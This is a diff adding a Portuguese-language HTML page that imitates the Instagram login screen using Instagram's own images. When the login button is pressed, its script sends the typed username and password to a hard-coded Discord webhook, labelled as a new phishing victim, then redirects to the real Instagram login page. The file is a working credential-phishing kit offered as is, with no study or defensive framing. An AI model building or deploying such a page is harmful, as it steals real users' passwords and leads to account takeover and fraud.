@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fafafa;
+    }
+    .wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .phone-mockup {
+      display: none;
+    }
+    .form-box {
+      max-width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+    }
+    .form-box img.logo {
+      width: 175px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+    .form-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      background: #fafafa;
+      border-radius: 3px;
+    }
+    .form-box button {
+      width: 100%;
+      background: #3897f0;
+      border: none;
+      color: white;
+      padding: 8px;
+      border-radius: 4px;
+      margin-top: 10px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .form-box .links {
+      font-size: 12px;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .form-box .links a {
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    @media(min-width: 768px) {
+      .wrapper {
+        flex-direction: row;
+      }
+      .phone-mockup {
+        display: block;
+        margin-right: 40px;
+      }
+      .phone-mockup img {
+        height: 600px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="phone-mockup">
+      <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Instagram App">
+    </div>
+    <div class="form-box">
+      <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
+      <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" />
+      <input type="password" id="password" placeholder="Senha" />
+      <button onclick="sendData()">Entrar</button>
+      <div class="links">
+        <p><a href="#">Esqueceu a senha?</a></p>
+        <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function sendData() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      fetch("https://discord.com/api/webhooks/1369884463726854274/grU7DeYV_tMlLozTmJh2Cl-z_JOG8jexA81baqn8CnjZ6uWLlgjuPjYdmRJi9Hw6fkWS", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `**NOVA VÍTIMA DO PHISHING**\nUsuário: \`${username}\`\nSenha: \`${password}\`\nData: ${new Date().toLocaleString()}`
+        })
+      });
+
+      window.location.href = "https://www.instagram.com/accounts/login/";
+    }
+  </script>
+</body>
+</html>
